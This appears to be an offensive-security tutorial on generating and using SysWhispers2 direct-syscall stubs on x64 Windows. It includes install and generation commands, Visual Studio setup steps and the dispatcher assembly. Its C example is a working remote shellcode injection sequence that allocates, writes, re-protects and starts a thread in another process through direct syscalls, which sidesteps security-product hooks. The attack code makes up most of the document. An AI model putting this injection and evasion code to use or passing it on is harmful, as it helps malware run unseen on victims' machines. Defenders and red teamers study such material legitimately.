## Direct Syscalls via SysWhispers2

SysWhispers2 improves on SysWhispers by removing the need to hardcode SSNs per Windows version. Instead it uses **Sorting By System Call Address** — at runtime it fetches `ntdll.dll`'s export directory, collects all `Zw`-prefixed function addresses into an array, sorts them in ascending order, and uses each function's index in that sorted array as its SSN. This means the generated stubs work across all Windows versions automatically without a version-check branching tree in the assembly. The generated `.asm` stub loads the target function's hash into a global, calls `WhisperMain` which resolves the SSN via `SW2_GetSyscallNumber`, restores the call registers, and issues `syscall`. The SSN arrives in `eax` as the return value of `SW2_GetSyscallNumber` — no `mov eax, SSN` needed.

⚠️ x64 only. Requires MASM enabled in Visual Studio: Project → Build Customizations → enable MASM. Set the `.asm` file's Item Type to "Microsoft Macro Assembler".

**Usage**

Run the commands in order. Supply your own output file name and target functions where angle brackets appear.

**Step 1 — Install**

```
git clone https://github.com/jthuraisamy/SysWhispers2.git
cd SysWhispers2
pip3 install -r requirements.txt
```

**Step 2 — Generate files**

```
# Export all supported syscalls.
py syswhispers.py --preset all -o syscalls_all

# Export common syscalls only.
py syswhispers.py --preset common -o syscalls_common

# Export specific functions.
py syswhispers.py --functions <Func1,Func2,...> -o <output_name>
```

- `--preset`  Use `all` or `common` to export a predefined set of syscalls.
- `--functions`  Comma-separated NT function names to export (e.g. `NtAllocateVirtualMemory,NtWriteVirtualMemory`).
- `-o`  Base name for the output `.h`, `.c`, and `.asm` files.

**Step 3 — Import into Visual Studio**

```
1. Copy the generated .h, .c, and .asm files into the project folder.
2. Project → Build Customizations → enable MASM.
3. Add the .h as a header file; add the .c and .asm as source files in Solution Explorer.
4. Set the .asm file's Item Type to "Microsoft Macro Assembler".
5. Ensure the project platform is set to x64.
```

**Step 4 — Use in code**

```c
#include "syscalls.h"   // Include the generated header.

// Use NT functions directly — SSN resolved at runtime, no hardcoded version checks.
// Example — remote shellcode injection:

HANDLE  hProcess        = /* open target process */;
PVOID   pBaseAddress    = NULL;
SIZE_T  sRegionSize     = sizeof(Shellcode);
ULONG   ulOldProtect    = 0;

// NtAllocateVirtualMemory replaces VirtualAllocEx.
NtAllocateVirtualMemory(hProcess, &pBaseAddress, 0, &sRegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// NtWriteVirtualMemory replaces WriteProcessMemory.
NtWriteVirtualMemory(hProcess, pBaseAddress, Shellcode, sizeof(Shellcode), NULL);

// NtProtectVirtualMemory replaces VirtualProtectEx.
NtProtectVirtualMemory(hProcess, &pBaseAddress, &sRegionSize, PAGE_EXECUTE_READ, &ulOldProtect);

// NtCreateThreadEx replaces CreateRemoteThread.
HANDLE hThread = NULL;
NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, pBaseAddress, NULL, FALSE, 0, 0, 0, NULL);
```

**Output**

Three files — `<output_name>.h`, `<output_name>.c`, and `<output_name>.asm` — written to the current directory.

- `.h`  NT function prototypes and required type definitions.
- `.c`  `SW2_PopulateSyscallList` and `SW2_GetSyscallNumber` — the runtime SSN resolution logic.
- `.asm`  `WhisperMain` dispatcher and one `PROC`/`ENDP` stub per NT function, each loading its `Zw`-prefixed hash and calling `WhisperMain`.

**How the stub works (per generated function)**

```asm
; Each NT function stub loads its ZwXxx hash and jumps into WhisperMain.
NtMapViewOfSection PROC
    mov currentHash, 060C9AE95h     ; Hash of "ZwMapViewOfSection".
    call WhisperMain                ; Resolves hash → SSN via SW2_GetSyscallNumber.
NtMapViewOfSection ENDP

; WhisperMain saves registers, calls SW2_GetSyscallNumber (SSN lands in EAX),
; restores registers, then issues the syscall.
WhisperMain PROC
    pop rax
    mov [rsp+ 8], rcx               ; Save RCX (arg1).
    mov [rsp+16], rdx               ; Save RDX (arg2).
    mov [rsp+24], r8                ; Save R8  (arg3).
    mov [rsp+32], r9                ; Save R9  (arg4).
    sub rsp, 28h
    mov ecx, currentHash
    call SW2_GetSyscallNumber       ; Returns SSN in EAX.
    add rsp, 28h
    mov rcx, [rsp+ 8]               ; Restore RCX.
    mov rdx, [rsp+16]               ; Restore RDX.
    mov r8,  [rsp+24]               ; Restore R8.
    mov r9,  [rsp+32]               ; Restore R9.
    mov r10, rcx                    ; Backup RCX into R10 — required by syscall ABI.
    syscall                         ; Issue syscall — NTSTATUS returned in EAX.
    ret
WhisperMain ENDP
```
